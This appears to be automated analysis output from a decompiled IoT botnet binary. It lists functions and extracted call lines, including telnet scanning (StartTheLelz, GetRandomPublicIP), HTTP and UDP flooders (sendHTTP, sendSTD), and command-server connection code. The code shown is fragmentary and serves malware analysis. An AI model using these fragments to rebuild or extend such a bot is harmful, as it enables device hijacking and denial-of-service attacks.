                        __GI_sigprocmask(2, v208, 0);
                    __GI_sigprocmask(2, v208, 0);
                    __GI_sigprocmask(2, v208, 0);
                    __GI_sigprocmask(2, v208, 0);
=================FUNCTION : _stdio_fopen ===================
++++++++ FUNCTION START 27271
++++++++ FUNCTION END 28052
++++++++ FUNCTION LENGTH 781
            if (__libc_open(a1, v203) < 0) {
                    free();
                free();
                        free();
            if (__libc_open(a1, v203) < 0) {
                    free();
                            free();
                free();
                free();
        if (__libc_open(a1, v203) < 0) {
                free();
                        free();
            free();
=================FUNCTION : __open_nameservers ===================
++++++++ FUNCTION START 64669
++++++++ FUNCTION END 65090
++++++++ FUNCTION LENGTH 421
    int32_t v194 = __GI_fopen((int32_t)"/etc/resolv.conf", (int32_t)&v193); // 0x1000e0b0
        int32_t v198 = __GI_fopen((int32_t)"/etc/config/resolv.conf", v197); // 0x1000e0c8
    while (true) {
        if (fgets(v200, 128, v196) == 0) {
            __GI_fclose((int16_t *)v195);
            while (true) {
                                while (true) {
                                        while (true) {
                                            while (true) {
                                                while (true) {
                                                free();
                                                    free();
                                                while (true) {
=================FUNCTION : print ===================
++++++++ FUNCTION START 3499
++++++++ FUNCTION END 4035
++++++++ FUNCTION LENGTH 536
    while (true) {
                    printchar(a1, (int32_t)*v201);
                        while (true) {
                            while (true) {
                                result2 = prints(v197, v221, v210, v206) + result;
                                    int32_t v224 = printi(v197, v223, 10, 1, v210, v206, 97) + result; // 0x10000cb0
                                        int32_t v226 = printi(v197, v225, 16, 0, v210, v206, 97) + result; // 0x10000d64
                                            int32_t v228 = printi(v197, v227, 16, 0, v210, v206, 65) + result; // 0x10000e18
                                                int32_t v230 = printi(v197, v229, 10, 0, v210, v206, 97) + result; // 0x10000ecc
                                                    int32_t v232 = prints(v197, (char *)&v200, v210, v206); // 0x10000f7c
            printchar(a1, (int32_t)*v201);
=================FUNCTION : StartTheLelz ===================
++++++++ FUNCTION START 12139
++++++++ FUNCTION END 12493
++++++++ FUNCTION LENGTH 354
    srand(v195 ^ rand_cmwc());
        while (true) {
        while (true) {
                    GetRandomPublicIP(v209);
                socket(2, 1, 0);
                    if (__libc_connect(*v213, (int32_t)&v196, 16) == -1) {
        while (true) {
        while (true) {
    while (true) {
    while (true) {
=================FUNCTION : __heap_free ===================
++++++++ FUNCTION START 46649
++++++++ FUNCTION END 46978
++++++++ FUNCTION LENGTH 329
            __heap_link_free_area((int32_t *)v196, result, v197, result3);
            __heap_link_free_area((int32_t *)v196, result, v197, result3);
                    __heap_link_free_area_after(a1, v201, v206, v199);
                    __heap_link_free_area_after(a1, result2, v200, v199);
            __heap_link_free_area(a1, v205, v200, result2);
    while (true) {
                        __heap_link_free_area_after(a1, v201, v206, v199);
                        __heap_link_free_area_after(a1, result2, v200, v199);
                __heap_link_free_area(a1, v205, v200, result2);
    __heap_link_free_area((int32_t *)v196, result, v197, result3);
=================FUNCTION : __uClibc_main ===================
++++++++ FUNCTION START 52113
++++++++ FUNCTION END 52528
++++++++ FUNCTION LENGTH 415
            v210 = getuid(0x10020000);
            v208 = geteuid();
                v211 = getgid(v208);
                if (v211 == getegid()) {
    while (true) {
        v210 = getuid(0x10020000);
        v208 = geteuid();
            v211 = getgid(v208);
            if (v211 == getegid()) {
=================FUNCTION : __GI_inet_ntop ===================
++++++++ FUNCTION START 70705
++++++++ FUNCTION END 71279
++++++++ FUNCTION LENGTH 574
        return inet_ntop4(a2, a3, a4);
        while (true) {
            while (true) {
                                        if (inet_ntop4(a2 + 12, v236, v237 - v236 + 86) == 0) {
                                v234 = sprintf(v236, (int32_t)"%x", v233, v197, v229, v230, v197, (int32_t)&v235);
                            if (inet_ntop4(a2 + 12, v236, v237 - v236 + 86) == 0) {
                v234 = sprintf(v231, (int32_t)"%x", v233, v197, v229, v230, v197, (int32_t)&v235);
                while (true) {
        while (true) {
=================FUNCTION : inet_pton ===================
++++++++ FUNCTION START 69848
++++++++ FUNCTION END 70450
++++++++ FUNCTION LENGTH 602
        inet_pton4(v196, a3);
                                while (true) {
                                while (true) {
            while (true) {
                while (true) {
                            if (inet_pton4(v203, v201) > 0) {
                                        while (true) {
                                                        while (true) {
                                                        while (true) {
=================FUNCTION : printi ===================
++++++++ FUNCTION START 3187
++++++++ FUNCTION END 3496
++++++++ FUNCTION LENGTH 309
        result2 = prints(a1, (char *)&v196, a5, a6);
            while (true) {
                        printchar((int32_t *)a1, 45);
                        result = prints(a1, v200, a5 - 1, a6);
            result = prints(a1, v201, a5, a6);
                    printchar((int32_t *)a1, 45);
                    result = prints(a1, v200, a5 - 1, a6);
        result2 = prints(a1, v201, a5, a6);
=================FUNCTION : recvLine ===================
++++++++ FUNCTION START 6765
++++++++ FUNCTION END 7098
++++++++ FUNCTION LENGTH 333
            while (true) {
                Rootsprintf(v206, (int32_t)"PING", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                while (true) {
                        while (true) {
                            if (__libc_recv(v206, (int32_t)&v212, 1, 0) != 1) {
                        while (true) {
    while (true) {
=================FUNCTION : sendHTTP ===================
++++++++ FUNCTION START 12733
++++++++ FUNCTION END 12997
++++++++ FUNCTION LENGTH 264
    while (true) {
        int32_t v200 = random() % 36; // 0x10004bc4
        sprintf(v198, (int32_t)"%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", a1, a4, a2, v201, (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36", v200);
        if (__libc_fork() != 0) {
                while (true) {
                    int32_t v203 = socket_connect(a2, a3, v196); // 0x10004c40
                        __libc_close(v203);
=================FUNCTION : negotiate ===================
++++++++ FUNCTION START 9486
++++++++ FUNCTION END 9736
++++++++ FUNCTION LENGTH 250
        __libc_send(a1, v199, 1, 0x4000);
                __libc_send(a1, v199, 1, 0x4000);
                __libc_send(a1, a2 + 2, 1, 0x4000);
            __libc_send(a1, v199, 1, 0x4000);
            __libc_send(a1, a2 + 2, 1, 0x4000);
        __libc_send(a1, v199, 1, 0x4000);
        __libc_send(a1, a2 + 2, 1, 0x4000);
=================FUNCTION : sendSTD ===================
++++++++ FUNCTION START 12496
++++++++ FUNCTION END 12730
++++++++ FUNCTION LENGTH 234
    int32_t v196 = socket(2, 2, 0); // 0x100049c0
    int32_t v198 = __GI_gethostbyname(a1); // 0x100049e4
    while (true) {
        random();
            __libc_send(v196, v207, 65, 0);
            __libc_connect(v196, v200, 16);
                __libc_close(v196);
=================FUNCTION : fdpclose ===================
++++++++ FUNCTION START 5160
++++++++ FUNCTION END 5409
++++++++ FUNCTION LENGTH 249
    __libc_close(a1);
    __GI_sigprocmask(0, v198, v200);
    while (true) {
        if (__libc_waitpid(v202, (int32_t)&v201, 0) == -1) {
        __GI_sigprocmask(2, v200, 0);
    __GI_sigprocmask(2, v200, 0);
=================FUNCTION : srandom_r ===================
++++++++ FUNCTION START 48478
++++++++ FUNCTION END 48764
++++++++ FUNCTION LENGTH 286
                while (true) {
                        __GI_random_r((int32_t *)v198, (int32_t)&v199);
                            __GI_random_r((int32_t *)v198, (int32_t)&v199);
            __GI_random_r((int32_t *)v198, (int32_t)&v199);
                __GI_random_r((int32_t *)v198, (int32_t)&v199);
=================FUNCTION : fflush_unlocked ===================
++++++++ FUNCTION START 33351
++++++++ FUNCTION END 33672
++++++++ FUNCTION LENGTH 321
            while (true) {
        _stdio_openlist_dec_use();
        _stdio_openlist_dec_use();
    while (true) {
    _stdio_openlist_dec_use();
=================FUNCTION : readUntil ===================
++++++++ FUNCTION START 10009
++++++++ FUNCTION END 10318
++++++++ FUNCTION LENGTH 309
        while (true) {
            while (true) {
                    int32_t v204 = __libc_recv(a1, v203, 1, 0); // 0x10002d48
                                if (strstr(a6, (char *)a2, v203) != 0) {
                            int32_t v208 = __libc_recv(a1, v203 + 1, 2, 0); // 0x10002db8
=================FUNCTION : _init ===================
++++++++ FUNCTION START 308
++++++++ FUNCTION END 603
++++++++ FUNCTION LENGTH 295
        "etrbhhgetrb",
        "Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)",
        "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)",
        "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)",
        "/dev/netslink/",
=================FUNCTION : strstr ===================
++++++++ FUNCTION START 36842
++++++++ FUNCTION END 37175
++++++++ FUNCTION LENGTH 333
    while (true) {
    while (true) {
                while (true) {
    while (true) {
    while (true) {
=================FUNCTION : getcwd ===================
++++++++ FUNCTION START 22050
++++++++ FUNCTION END 22417
++++++++ FUNCTION LENGTH 367
            __GI_getpagesize();
                        free();
                free();
            free();
=================FUNCTION : connectTimeout ===================
++++++++ FUNCTION START 8987
++++++++ FUNCTION END 9252
++++++++ FUNCTION LENGTH 265
    if (getHost(a2, &v198, v197) != 0) {
    if (__libc_connect(a1, v197, 16) > -1) {
        while (true) {
                getsockopt(a1, 1, 4, (int32_t)&v208, (int32_t)&v207);
=================FUNCTION : _vfprintf_internal ===================
++++++++ FUNCTION START 29408
++++++++ FUNCTION END 30318
++++++++ FUNCTION LENGTH 910
    while (true) {
        while (true) {
                            while (true) {
                                            while (true) {
=================FUNCTION : socket_connect ===================
++++++++ FUNCTION START 11903
++++++++ FUNCTION END 12136
++++++++ FUNCTION LENGTH 233
    if (__GI_gethostbyname(a1) == 0) {
    int32_t v202 = socket(2, 1, 6); // 0x1000393c
    __GI_setsockopt(v202, 6, 1, (int32_t)&v196, 4);
    if (__libc_connect(v202, v198, 16) == -1) {
=================FUNCTION : __GI_memchr ===================
++++++++ FUNCTION START 62103
++++++++ FUNCTION END 62424
++++++++ FUNCTION LENGTH 321
        while (true) {
        while (true) {
        while (true) {
    while (true) {
=================FUNCTION : Rootsprintf ===================
++++++++ FUNCTION START 4440
++++++++ FUNCTION END 4645
++++++++ FUNCTION LENGTH 205
    print(&v197, a2, (int32_t)&v198);
    int32_t result = __libc_send(a1, v196, __GI_strlen(), 0x4000); // 0x10001270
    free();
=================FUNCTION : initConnection ===================
++++++++ FUNCTION START 18460
++++++++ FUNCTION END 18695
++++++++ FUNCTION LENGTH 235
        __libc_close(v197);
    int32_t v204 = socket(2, 1, 0); // 0x10006788
    return connectTimeout(v204, v195, v202, 30, v195) == 0;
=================FUNCTION : listFork ===================
++++++++ FUNCTION START 9255
++++++++ FUNCTION END 9483
++++++++ FUNCTION LENGTH 228
    int32_t result = __libc_fork(); // 0x100026f4
    while (true) {
                free();
=================FUNCTION : realloc ===================
++++++++ FUNCTION START 45445
++++++++ FUNCTION END 45710
++++++++ FUNCTION LENGTH 265
        free();
            __heap_free(&v200, v198 + v196, v201 - v198);
        free();
=================FUNCTION : __GI_fclose ===================
++++++++ FUNCTION START 26404
++++++++ FUNCTION END 26649
++++++++ FUNCTION LENGTH 245
    if (__libc_close(v197) <= 0xffffffff) {
        free();
    _stdio_openlist_dec_use();
=================FUNCTION : __GI_strncat ===================
++++++++ FUNCTION START 68837
++++++++ FUNCTION END 69128
++++++++ FUNCTION LENGTH 291
        while (true) {
                while (true) {
    while (true) {
=================FUNCTION : strnlen ===================
++++++++ FUNCTION START 36538
++++++++ FUNCTION END 36839
++++++++ FUNCTION LENGTH 301
            while (true) {
    while (true) {
    while (true) {
=================FUNCTION : strncpy ===================
++++++++ FUNCTION START 36229
++++++++ FUNCTION END 36535
++++++++ FUNCTION LENGTH 306
        while (true) {
        while (true) {
        while (true) {
=================FUNCTION : _stdlib_strto_l ===================
++++++++ FUNCTION START 49400
++++++++ FUNCTION END 49870
++++++++ FUNCTION LENGTH 470
    while (true) {
                        while (true) {
                while (true) {
=================FUNCTION : contains_string ===================
++++++++ FUNCTION START 8753
++++++++ FUNCTION END 8984
++++++++ FUNCTION LENGTH 231
        while (true) {
            if (strcasestr((char *)a1, v199, 4 * v198 + a2) == 0) {
=================FUNCTION : __GI_strlen ===================
++++++++ FUNCTION START 35944
++++++++ FUNCTION END 36226
++++++++ FUNCTION LENGTH 282
        while (true) {
    while (true) {
=================FUNCTION : matchPrompt ===================
++++++++ FUNCTION START 9739
++++++++ FUNCTION END 10006
++++++++ FUNCTION LENGTH 267
    while (true) {
        while (true) {
=================FUNCTION : __open_etc_hosts ===================
++++++++ FUNCTION START 72369
++++++++ FUNCTION END 72576
++++++++ FUNCTION LENGTH 207
    int32_t v196 = __GI_fopen((int32_t)"/etc/hosts", (int32_t)&v195); // 0x1000f6f8
        result = __GI_fopen((int32_t)"/etc/config/hosts", v197);
=================FUNCTION : __stdio_WRITE ===================
++++++++ FUNCTION START 55595
++++++++ FUNCTION END 55890
++++++++ FUNCTION LENGTH 295
    while (true) {
            while (true) {
=================FUNCTION : __GI_fgets_unlocked ===================
++++++++ FUNCTION START 33675
++++++++ FUNCTION END 33973
++++++++ FUNCTION LENGTH 298
            while (true) {
                char v203 = getc_unlocked((int16_t *)a3, v199); // 0x10009b98
=================FUNCTION : abort ===================
++++++++ FUNCTION START 65514
++++++++ FUNCTION END 65830
++++++++ FUNCTION LENGTH 316
            __GI_sigprocmask(1, v196, 0);
        __GI_sigprocmask(1, v196, 0);
=================FUNCTION : memrchr ===================
++++++++ FUNCTION START 62629
++++++++ FUNCTION END 62950
++++++++ FUNCTION LENGTH 321
        while (true) {
        while (true) {
=================FUNCTION : __GI_strchr ===================
++++++++ FUNCTION START 35197
++++++++ FUNCTION END 35504
++++++++ FUNCTION LENGTH 307
        while (true) {
    while (true) {
=================FUNCTION : _uintmaxtostr ===================
++++++++ FUNCTION START 57007
++++++++ FUNCTION END 57322
++++++++ FUNCTION LENGTH 315
        while (true) {
    while (true) {
=================FUNCTION : __GI_strpbrk ===================
++++++++ FUNCTION START 63178
++++++++ FUNCTION END 63413
++++++++ FUNCTION LENGTH 235
    while (true) {
        while (true) {
=================FUNCTION : read_with_timeout ===================
++++++++ FUNCTION START 7511
++++++++ FUNCTION END 7732
++++++++ FUNCTION LENGTH 221
    while (true) {
            return __libc_recv(a1, a3, a4, 0);
=================FUNCTION : _stdio_openlist_dec_use ===================
++++++++ FUNCTION START 33086
++++++++ FUNCTION END 33348
++++++++ FUNCTION LENGTH 262
            while (true) {
                        free();
=================FUNCTION : inet_aton ===================
++++++++ FUNCTION START 63416
++++++++ FUNCTION END 63702
++++++++ FUNCTION LENGTH 286
    while (true) {
        while (true) {
=================FUNCTION : _stdio_term ===================
++++++++ FUNCTION START 28461
++++++++ FUNCTION END 28710
++++++++ FUNCTION LENGTH 249
        while (true) {
    while (true) {
=================FUNCTION : execl ===================
++++++++ FUNCTION START 50088
++++++++ FUNCTION END 50355
++++++++ FUNCTION LENGTH 267
    while (true) {
    while (true) {
=================FUNCTION : __GI_initstate_r ===================
++++++++ FUNCTION START 48767
++++++++ FUNCTION END 48995
++++++++ FUNCTION LENGTH 228
        srandom_r();
    srandom_r();
=================FUNCTION : trim ===================
++++++++ FUNCTION START 2076
++++++++ FUNCTION END 2336
++++++++ FUNCTION LENGTH 260
    while (true) {
            while (true) {
=================FUNCTION : __libc_connect ===================
++++++++ FUNCTION START 42013
++++++++ FUNCTION END 42210
++++++++ FUNCTION LENGTH 197
    return __socketcall(3, (int32_t)&a1);
=================FUNCTION : sclose ===================
++++++++ FUNCTION START 11695
++++++++ FUNCTION END 11900
++++++++ FUNCTION LENGTH 205
        __libc_close(a1);
=================FUNCTION : srand ===================
++++++++ FUNCTION START 47805
++++++++ FUNCTION END 48006
++++++++ FUNCTION LENGTH 201
    srandom_r();
=================FUNCTION : __libc_send ===================
++++++++ FUNCTION START 42813
++++++++ FUNCTION END 43010
++++++++ FUNCTION LENGTH 197
    return __socketcall(9, (int32_t)&a1);
=================FUNCTION : __GI_strspn ===================
++++++++ FUNCTION START 69131
++++++++ FUNCTION END 69364
++++++++ FUNCTION LENGTH 233
    while (true) {
=================FUNCTION : __GI_inet_ntoa_r ===================
++++++++ FUNCTION START 40103
++++++++ FUNCTION END 40323
++++++++ FUNCTION LENGTH 220
    while (true) {
=================FUNCTION : malloc ===================
++++++++ FUNCTION START 44906
++++++++ FUNCTION END 45187
++++++++ FUNCTION LENGTH 281
            __heap_free((int32_t *)v204, v202, v205);
=================FUNCTION : __GI_gethostbyname ===================
++++++++ FUNCTION START 40735
++++++++ FUNCTION END 40935
++++++++ FUNCTION LENGTH 200
    gethostbyname_r(a1, &v196, (int32_t)&v195, 460, (int32_t)&result, v194);
=================FUNCTION : inet_addr ===================
++++++++ FUNCTION START 40527
++++++++ FUNCTION END 40732
++++++++ FUNCTION LENGTH 205
    if (inet_aton((char *)&result) != 0) {
=================FUNCTION : GetRandomIP ===================
++++++++ FUNCTION START 10732
++++++++ FUNCTION END 10931
++++++++ FUNCTION LENGTH 199
    return rand_cmwc() & -1 - a1 ^ v196 & a1;
=================FUNCTION : __libc_creat ===================
++++++++ FUNCTION START 23682
++++++++ FUNCTION END 23880
++++++++ FUNCTION LENGTH 198
    return __libc_open(577, 577);
=================FUNCTION : __check_one_fd ===================
++++++++ FUNCTION START 51684
++++++++ FUNCTION END 51896
++++++++ FUNCTION LENGTH 212
    int32_t v196 = __libc_open((int32_t)"/dev/null", a2); // 0x1000c120
=================FUNCTION : strcasestr ===================
++++++++ FUNCTION START 38115
++++++++ FUNCTION END 38343
++++++++ FUNCTION LENGTH 228
    while (true) {
=================FUNCTION : random ===================
++++++++ FUNCTION START 47182
++++++++ FUNCTION END 47385
++++++++ FUNCTION LENGTH 203
    __GI_random_r((int32_t *)0x100248f0, (int32_t)&result);
=================FUNCTION : getsockopt ===================
++++++++ FUNCTION START 42413
++++++++ FUNCTION END 42610
++++++++ FUNCTION LENGTH 197
    return __socketcall(15, (int32_t)&a1);
=================FUNCTION : zprintf ===================
++++++++ FUNCTION START 4038
++++++++ FUNCTION END 4236
++++++++ FUNCTION LENGTH 198
    return print(NULL, a1, (int32_t)&v196);
=================FUNCTION : __GI_wcsnrtombs ===================
++++++++ FUNCTION START 55289
++++++++ FUNCTION END 55592
++++++++ FUNCTION LENGTH 303
            while (true) {
=================FUNCTION : inet_ntop4 ===================
++++++++ FUNCTION START 70453
++++++++ FUNCTION END 70702
++++++++ FUNCTION LENGTH 249
    while (true) {
=================FUNCTION : free ===================
++++++++ FUNCTION START 45190
++++++++ FUNCTION END 45442
++++++++ FUNCTION LENGTH 252
    int32_t v197 = __heap_free(&v195, v194 - 4, v196); // 0x1000b0cc
=================FUNCTION : socket ===================
++++++++ FUNCTION START 43413
++++++++ FUNCTION END 43610
++++++++ FUNCTION LENGTH 197
    return __socketcall(1, (int32_t)&a1);
=================FUNCTION : advance_state ===================
++++++++ FUNCTION START 7735
++++++++ FUNCTION END 7940
++++++++ FUNCTION LENGTH 205
        __libc_close(*a1);
=================FUNCTION : fdgets ===================
++++++++ FUNCTION START 5412
++++++++ FUNCTION END 5635
++++++++ FUNCTION LENGTH 223
    while (true) {
=================FUNCTION : __GI__exit ===================
++++++++ FUNCTION START 20995
++++++++ FUNCTION END 21203
++++++++ FUNCTION LENGTH 208
    while (true) {
=================FUNCTION : rawmemchr ===================
++++++++ FUNCTION START 68553
++++++++ FUNCTION END 68834
++++++++ FUNCTION LENGTH 281
    while (true) {
=================FUNCTION : __GI_fopen ===================
++++++++ FUNCTION START 26652
++++++++ FUNCTION END 26850
++++++++ FUNCTION LENGTH 198
    return _stdio_fopen(0, (char *)-1);
=================FUNCTION : __GI_getsockname ===================
++++++++ FUNCTION START 42213
++++++++ FUNCTION END 42410
++++++++ FUNCTION LENGTH 197
    return __socketcall(6, (int32_t)&a1);
=================FUNCTION : _ppfs_init ===================
++++++++ FUNCTION START 30321
++++++++ FUNCTION END 30566
++++++++ FUNCTION LENGTH 245
    while (true) {
=================FUNCTION : __GI_vsnprintf ===================
++++++++ FUNCTION START 27056
++++++++ FUNCTION END 27268
++++++++ FUNCTION LENGTH 212
    int32_t result = _vfprintf_internal(); // 0x100081f4
=================FUNCTION : __libc_waitpid ===================
++++++++ FUNCTION START 25385
++++++++ FUNCTION END 25583
++++++++ FUNCTION LENGTH 198
    return wait4(0);
=================FUNCTION : rand ===================
++++++++ FUNCTION START 46981
++++++++ FUNCTION END 47179
++++++++ FUNCTION LENGTH 198
    return random();
=================FUNCTION : __xpg_strerror_r ===================
++++++++ FUNCTION START 37381
++++++++ FUNCTION END 37670
++++++++ FUNCTION LENGTH 289
        while (true) {
=================FUNCTION : __GI_setsockopt ===================
++++++++ FUNCTION START 43213
++++++++ FUNCTION END 43410
++++++++ FUNCTION LENGTH 197
    return __socketcall(14, (int32_t)&a1);
=================FUNCTION : fgets ===================
++++++++ FUNCTION START 32654
++++++++ FUNCTION END 32867
++++++++ FUNCTION LENGTH 213
    int32_t result = __GI_fgets_unlocked((char *)v196, a2, a3); // 0x100097ac
=================FUNCTION : inet_pton4 ===================
++++++++ FUNCTION START 69578
++++++++ FUNCTION END 69845
++++++++ FUNCTION LENGTH 267
    while (true) {
=================FUNCTION : __libc_sendto ===================
++++++++ FUNCTION START 43013
++++++++ FUNCTION END 43210
++++++++ FUNCTION LENGTH 197
    return __socketcall(11, (int32_t)&a1);
=================FUNCTION : __GI_inet_ntoa ===================
++++++++ FUNCTION START 40326
++++++++ FUNCTION END 40524
++++++++ FUNCTION LENGTH 198
    return __GI_inet_ntoa_r(&v195, (int32_t)&v196);
=================FUNCTION : makeIPPacket ===================
++++++++ FUNCTION START 11492
++++++++ FUNCTION END 11692
++++++++ FUNCTION LENGTH 200
    return rand_cmwc();
=================FUNCTION : __heap_alloc ===================
++++++++ FUNCTION START 45713
++++++++ FUNCTION END 45976
++++++++ FUNCTION LENGTH 263
    while (true) {
=================FUNCTION : __GI_strcasecmp ===================
++++++++ FUNCTION START 37874
++++++++ FUNCTION END 38112
++++++++ FUNCTION LENGTH 238
    while (true) {
=================FUNCTION : _ppfs_setargs ===================
++++++++ FUNCTION START 30780
++++++++ FUNCTION END 31166
++++++++ FUNCTION LENGTH 386
            while (true) {
=================FUNCTION : getdtablesize ===================
++++++++ FUNCTION START 22420
++++++++ FUNCTION END 22625
++++++++ FUNCTION LENGTH 205
    if (getrlimit(7, (int32_t)&result) >= 0) {
=================FUNCTION : getHost ===================
++++++++ FUNCTION START 6131
++++++++ FUNCTION END 6330
++++++++ FUNCTION LENGTH 199
    int32_t v196 = inet_addr(a1); // 0x10001a70
=================FUNCTION : get_telstate_host ===================
++++++++ FUNCTION START 7101
++++++++ FUNCTION END 7299
++++++++ FUNCTION LENGTH 198
    return __GI_inet_ntoa(&v196, a1);
=================FUNCTION : __raise ===================
++++++++ FUNCTION START 73238
++++++++ FUNCTION END 73436
++++++++ FUNCTION LENGTH 198
    return kill(__libc_getpid(), a1);
=================FUNCTION : szprintf ===================
++++++++ FUNCTION START 4239
++++++++ FUNCTION END 4437
++++++++ FUNCTION LENGTH 198
    return print(&a1, a2, (int32_t)&v196);
=================FUNCTION : __get_hosts_byname_r ===================
++++++++ FUNCTION START 65093
++++++++ FUNCTION END 65293
++++++++ FUNCTION LENGTH 200
    int32_t result = __read_etc_hosts_r(0, a1, a2, 0, (int32_t *)a3, a4, a5, (int32_t)&v196, a7); // 0x1000e36c
=================FUNCTION : tcpcsum ===================
++++++++ FUNCTION START 11286
++++++++ FUNCTION END 11489
++++++++ FUNCTION LENGTH 203
    free();
=================FUNCTION : sprintf ===================
++++++++ FUNCTION START 26853
++++++++ FUNCTION END 27053
++++++++ FUNCTION LENGTH 200
    return __GI_vsnprintf();
=================FUNCTION : __length_dotted ===================
++++++++ FUNCTION START 74442
++++++++ FUNCTION END 74667
++++++++ FUNCTION LENGTH 225
    while (true) {
=================FUNCTION : __libc_recv ===================
++++++++ FUNCTION START 42613
++++++++ FUNCTION END 42810
++++++++ FUNCTION LENGTH 197
    return __socketcall(10, (int32_t)&a1);
=================FUNCTION : __decode_dotted ===================
++++++++ FUNCTION START 74143
++++++++ FUNCTION END 74439
++++++++ FUNCTION LENGTH 296
    while (true) {
=================FUNCTION : __heap_alloc_at ===================
++++++++ FUNCTION START 45979
++++++++ FUNCTION END 46230
++++++++ FUNCTION LENGTH 251
    while (true) {
=================FUNCTION : ioctl ===================
++++++++ FUNCTION START 20080
++++++++ FUNCTION END 20353
++++++++ FUNCTION LENGTH 273
            return __GI_tcgetattr((int32_t *)a3);
=================FUNCTION : _charpad ===================
++++++++ FUNCTION START 28927
++++++++ FUNCTION END 29151
++++++++ FUNCTION LENGTH 224
    while (true) {
=================FUNCTION : isatty ===================
++++++++ FUNCTION START 38547
++++++++ FUNCTION END 38746
++++++++ FUNCTION LENGTH 199
    __GI_tcgetattr(&v196);
=================FUNCTION : memcpy ===================
++++++++ FUNCTION START 34446
++++++++ FUNCTION END 34835
++++++++ FUNCTION LENGTH 389
        while (true) {
=================FUNCTION : makeRandomStr ===================
++++++++ FUNCTION START 6553
++++++++ FUNCTION END 6762
++++++++ FUNCTION LENGTH 209
            v196 = rand_cmwc();
=================FUNCTION : parseHex ===================
++++++++ FUNCTION START 5638
++++++++ FUNCTION END 5863
++++++++ FUNCTION LENGTH 225
    while (true) {
=================FUNCTION : __encode_dotted ===================
++++++++ FUNCTION START 73861
++++++++ FUNCTION END 74140
++++++++ FUNCTION LENGTH 279
    while (true) {
=================FUNCTION : __GI_strcoll ===================
++++++++ FUNCTION START 35507
++++++++ FUNCTION END 35727
++++++++ FUNCTION LENGTH 220
    while (true) {
================================================================================
========	WHILE LOOPS INTRESTING INSTRUCTIONS : =================================
================================================================================
=============================WHILE LOOPS ID : 1 @ trim ====================================
++++++++ WHILE START : 2275 
++++++++ WHILE FUNCTION : trim 
++++++++ WHILE END : 2335 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 2 @ prints ====================================
++++++++ WHILE START : 2769 
++++++++ WHILE FUNCTION : prints 
++++++++ WHILE END : 2780 
++++++++ INTRESTING INSTRUCTIONS :  
		printchar((int32_t *)a1, v198);
=============================WHILE LOOPS ID : 3 @ prints ====================================
++++++++ WHILE START : 2915 
++++++++ WHILE FUNCTION : prints 
++++++++ WHILE END : 2926 
++++++++ INTRESTING INSTRUCTIONS :  
		printchar((int32_t *)a1, v198);
=============================WHILE LOOPS ID : 4 @ prints ====================================
++++++++ WHILE START : 3068 
++++++++ WHILE FUNCTION : prints 
++++++++ WHILE END : 3079 
++++++++ INTRESTING INSTRUCTIONS :  
		printchar((int32_t *)a1, v198);
=============================WHILE LOOPS ID : 6 @ print ====================================
++++++++ WHILE START : 3712 
++++++++ WHILE FUNCTION : print 
++++++++ WHILE END : 4027 
++++++++ INTRESTING INSTRUCTIONS :  
		printchar(a1, (int32_t)*v201);
		while (true) {
		while (true) {
		result2 = prints(v197, v221, v210, v206) + result;
		int32_t v224 = printi(v197, v223, 10, 1, v210, v206, 97) + result; // 0x10000cb0
		int32_t v226 = printi(v197, v225, 16, 0, v210, v206, 97) + result; // 0x10000d64
		int32_t v228 = printi(v197, v227, 16, 0, v210, v206, 65) + result; // 0x10000e18
		int32_t v230 = printi(v197, v229, 10, 0, v210, v206, 97) + result; // 0x10000ecc
		int32_t v232 = prints(v197, (char *)&v200, v210, v206); // 0x10000f7c
		printchar(a1, (int32_t)*v201);
=============================WHILE LOOPS ID : 7 @ fdpclose ====================================
++++++++ WHILE START : 5378 
++++++++ WHILE FUNCTION : fdpclose 
++++++++ WHILE END : 5401 
++++++++ INTRESTING INSTRUCTIONS :  
		if (__libc_waitpid(v202, (int32_t)&v201, 0) == -1) {
		__GI_sigprocmask(2, v200, 0);
=============================WHILE LOOPS ID : 10 @ recvLine ====================================
++++++++ WHILE START : 6984 
++++++++ WHILE FUNCTION : recvLine 
++++++++ WHILE END : 7078 
++++++++ INTRESTING INSTRUCTIONS :  
		Rootsprintf(v206, (int32_t)"PING", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
		while (true) {
		while (true) {
		if (__libc_recv(v206, (int32_t)&v212, 1, 0) != 1) {
		while (true) {
=============================WHILE LOOPS ID : 12 @ read_with_timeout ====================================
++++++++ WHILE START : 7714 
++++++++ WHILE FUNCTION : read_with_timeout 
++++++++ WHILE END : 7731 
++++++++ INTRESTING INSTRUCTIONS :  
		return __libc_recv(a1, a3, a4, 0);
=============================WHILE LOOPS ID : 13 @ contains_string ====================================
++++++++ WHILE START : 8961 
++++++++ WHILE FUNCTION : contains_string 
++++++++ WHILE END : 8978 
++++++++ INTRESTING INSTRUCTIONS :  
		if (strcasestr((char *)a1, v199, 4 * v198 + a2) == 0) {
=============================WHILE LOOPS ID : 14 @ connectTimeout ====================================
++++++++ WHILE START : 9217 
++++++++ WHILE FUNCTION : connectTimeout 
++++++++ WHILE END : 9248 
++++++++ INTRESTING INSTRUCTIONS :  
		getsockopt(a1, 1, 4, (int32_t)&v208, (int32_t)&v207);
=============================WHILE LOOPS ID : 15 @ listFork ====================================
++++++++ WHILE START : 9462 
++++++++ WHILE FUNCTION : listFork 
++++++++ WHILE END : 9482 
++++++++ INTRESTING INSTRUCTIONS :  
		free();
=============================WHILE LOOPS ID : 16 @ matchPrompt ====================================
++++++++ WHILE START : 9944 
++++++++ WHILE FUNCTION : matchPrompt 
++++++++ WHILE END : 10005 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
